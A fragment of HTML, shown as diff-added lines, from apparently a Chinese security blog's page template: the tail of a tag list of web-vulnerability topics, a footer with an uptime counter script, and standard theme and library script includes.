rel="tag">开源CMS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" rel="tag">弱类型</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/" rel="tag">支付漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99/" rel="tag">正则</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/" rel="tag">正则绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" rel="tag">源码泄露</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%82%B8%E5%BC%B9/" rel="tag">炸弹</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="tag">环境配置</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%A6%E6%9D%9F%E7%9A%84SQL%E6%94%BB%E5%87%BB/" rel="tag">约束的SQL攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%84%E4%BB%B6/" rel="tag">组件</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/" rel="tag">综合靶场测试</a><span class="tag-list-count">91</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81/" rel="tag">网页源代码</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A6%86%E7%9B%96/" rel="tag">覆盖</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B6%8A%E6%9D%83/" rel="tag">越权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="tag">逻辑漏洞</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%87%8D%E6%94%BE/" rel="tag">重放</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E6%9C%BA%E6%95%B0/" rel="tag">随机数</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
+                </canvas>
+            </div>
+        </div>
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">菜心</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">1.1m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">16:38</span>
+</div>
+
+<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+<a href="https://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">粤ICP备2020128930号</a>
+
+<!-- 网站运行时间的设置 begin-->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>  workhard!
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("01/05/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+}
+setInterval("createtime()",250);
+</script>
+<!-- 网站运行时间的设置 end-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//fastly.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//fastly.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//fastly.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
